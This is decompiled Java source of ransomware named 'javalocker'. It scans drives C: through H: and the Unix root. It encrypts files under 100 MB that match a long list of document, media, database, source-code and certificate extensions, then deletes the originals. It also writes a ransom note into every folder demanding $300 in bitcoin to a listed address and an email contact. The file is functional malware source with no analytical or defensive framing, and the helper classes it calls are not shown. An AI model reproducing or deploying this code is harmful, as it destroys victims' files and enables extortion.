// 
// Decompiled by Procyon v0.5.36
// 

package javabasic;

import java.util.Scanner;
import java.io.FileWriter;
import java.util.Collection;
import java.util.Arrays;
import java.util.LinkedList;
import java.io.Writer;
import java.io.IOException;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.File;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class JAVABASIC
{

    /**
     *
     */
    public static Encryption enf;
    
    private static String findexname(final String filename) {
        final String pa = "\\.[^\\.]*$";
        final Pattern p = Pattern.compile(pa);
        final Matcher mc = p.matcher(filename);
        final boolean bl = mc.find();
        if (!bl) {
            return ".";
        }
        final int s = mc.start();
        final int e = mc.end();
        final int j = 0;
        final StringBuilder bu = new StringBuilder();
        for (int i = s; i < e; ++i) {
            bu.append(filename.charAt(i));
        }
        return bu.toString();
    }
    
    public static String readFileContent(final String fileName) {
        final File file = new File(fileName);
        BufferedReader reader = null;
        final StringBuffer sbf = new StringBuffer();
        try {
            reader = new BufferedReader(new FileReader(file));
            String tempStr;
            while ((tempStr = reader.readLine()) != null) {
                sbf.append(tempStr);
            }
            reader.close();
            return sbf.toString();
        }
        catch (IOException ex) {}
        finally {
            if (reader != null) {
                try {
                    reader.close();
                }
                catch (IOException ex2) {}
            }
        }
        return sbf.toString();
    }
    
    public static boolean rename(final File file, final String newName) {
        if (file == null) {
            return false;
        }
        if (!file.exists()) {
            return false;
        }
        if (newName.equals(file.getName())) {
            return true;
        }
        final File newFile = new File(file.getParent() + File.separator + newName);
        return !newFile.exists() && file.renameTo(newFile);
    }
    
    public static void tryencrpt(final String p) {
        final String[] type = { ".accdb", ".pub", ".reg", ".ico", ".mui", ".onetoc2", ".dwg", ".wk1", ".wks", ".vsdx", ".vsd", ".eml", ".msg", ".ost", ".pst", ".pptx", ".jfif", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".ost", ".msg", ".eml", ".vsd", ".txt", ".csv", ".rtf", ".123", ".wks", ".pdf", ".dwg", ".onetoc2", ".snt", ".snt", ".jpeg", ".jpg", ".docb", ".docm", ".zip", ".7z", ".rar", ".mp4", ".wav", ".mp3", ".cpp", ".gho", ".iso", ".mui", ".flv", ".wma", ".key", ".sln", ".vbs", ".bat", ".cs", ".ini", ".cmd", ".lv", ".c", ".js", ".php", ".mp4", ".html", ".py", ".docb", ".pps", ".gz", ".gpg", ".xlsm", ".vmdk", ".vmx", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".edb", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm", ".vdi", ".aes", ".arc", ".paq", ".bz2", ".tbk", ".bak", ".tar", ".gz", ".backup", ".vcd", ".bmp", ".png", ".gif", ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu", ".m4u", ".m3u", ".mid", ".wma", ".3g2", ".mkv", ".3gp", ".mov", ".avi", ".asf", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".sh", ".rb", ".asp", ".php", ".jsp", ".brd", ".sch", ".dch", ".dip", ".dp", ".vb", ".vbs", ".ps1", ".asm", ".h", ".pas", ".suo", ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm", ".obd", ".dbf", ".db", ".mdb", ".accdb", ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", ".uop", ".std", ".sxd", ".otp", ".odp", ".wb2", ".slk", ".dif", ".stc", ".sxc", ".ots", ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem", ".p12", ".csr", ".crt", ".pfx", ".der" };
        final String res = findexname(p);
        res.trim();
        for (final String s : type) {
            if (res.compareToIgnoreCase(s) == 0) {
                final Writer out = null;
                final String con = readFileContent(p);
                try {
                    key.main(p, p + ".javalocker");
                }
                catch (Exception ex) {}
                final File f = new File(p);
                if (f.canWrite()) {
                    f.delete();
                }
            }
        }
    }
    
    public static void folderMethod1(final String path) {
        int fileNum = 0;
        int folderNum = 0;
        final File file = new File(path);
        final LinkedList<File> list = new LinkedList<File>();
        if (file.exists()) {
            if (null == file.listFiles()) {
                return;
            }
            list.addAll(Arrays.asList(file.listFiles()));
            while (!list.isEmpty()) {
                final File[] files = list.removeFirst().listFiles();
                if (null == files) {
                    continue;
                }
                for (final File f : files) {
                    if (f.isDirectory() && !f.getAbsolutePath().startsWith("C:\\Windows")) {
                        final File fj = new File(f.getAbsolutePath() + "\\readmeonnotepad.javaencrypt");
                        try {
                            fj.createNewFile();
                            if (fj.canWrite()) {
                                Writer out = null;
                                out = new FileWriter(fj);
                                final String data = "Q: What Happen to my computer?\n A:Your personal files are encrypted by javalocker!\nQ How can I recover my Files? A You need to send 300$ of bitcoins to the following adress:BAW4VM2dhxYgXeQepOHKHSQVG6NgaEb94 then contact soviet@12334@gmail.com!";
                                out.write(data);
                                out.close();
                                final crea cr = new crea();
                                cr.creat(f);
                            }
                        }
                        catch (IOException ex) {}
                        list.add(f);
                        ++folderNum;
                    }
                    else {
                        if (f.length() < 104857600L) {
                            tryencrpt(f.getAbsolutePath());
                            final File fgf = new File(f.getPath() + "DESkey.dat");
                            fgf.delete();
                        }
                        ++fileNum;
                    }
                }
            }
        }
    }
    
    public static void find2(final String path) {
        final File file = new File(path);
        final File[] fs = file.listFiles();
        if (fs == null) {
            return;
        }
        for (final File f : fs) {
            if (!f.isDirectory() && !f.getAbsolutePath().startsWith("C:\\Windows")) {
                if (f.length() < 104857600L) {
                    tryencrpt(f.getAbsolutePath());
                }
            }
            else {
                final File fj = new File(f.getAbsolutePath() + "\\readmeonnotepad.javaencrypt");
                try {
                    fj.createNewFile();
                    if (fj.canWrite()) {
                        Writer out = null;
                        out = new FileWriter(fj);
                        final String data = "Q: What Happen to my computer?\n A:Your personal files are encrypted by javalocker!\nQ How can I recover my Files? A You need to send 300$ of bitcoins to the following adress:BAW4VM2dhxYgXeQepOHKHSQVG6NgaEb94 then contact soviet@12334@gmail.com!";
                        out.write(data);
                        out.close();
                        final crea cr = new crea();
                        cr.creat(f);
                    }
                }
                catch (IOException ex) {}
            }
        }
    }
    
    public static void ret(final File f) {
        final File fj = new File(f.getAbsolutePath() + "\\readmeonnotepad.javaencrypt");
        try {
            fj.createNewFile();
            if (fj.canWrite()) {
                Writer out = null;
                out = new FileWriter(fj);
                final String data = "Q: What Happen to my computer?\n A:Your personal files are encrypted by javalocker!\nQ How can I recover my Files? A You need to send 300$ of bitcoins to the following adress:BAW4VM2dhxYgXeQepOHKHSQVG6NgaEb94 then contact soviet@12334@gmail.com!";
                out.write(data);
                out.close();
                final crea cr = new crea();
                cr.creat(f);
            }
        }
        catch (IOException ex) {}
    }
    
    public static void main(final String[] args) throws IOException, Exception {
        final Scanner sc = new Scanner(System.in);
        ret(new File("C:\\"));
        ret(new File("D:\\"));
        ret(new File("E:\\"));
        ret(new File("F:\\"));
        ret(new File("G:\\"));
        ret(new File("H:\\"));
        find2("D:\\");
        folderMethod1("D:\\");
        find2("E:\\");
        folderMethod1("E:\\");
        find2("F:\\");
        folderMethod1("F:\\");
        find2("G:\\");
        folderMethod1("G:\\");
        find2("H:\\");
        folderMethod1("H:\\");
        find2("C:\\");
        folderMethod1("C:\\");
        find2("/");
        folderMethod1("/");
    }
    
    static {
        JAVABASIC.enf = new Encryption();
    }
}
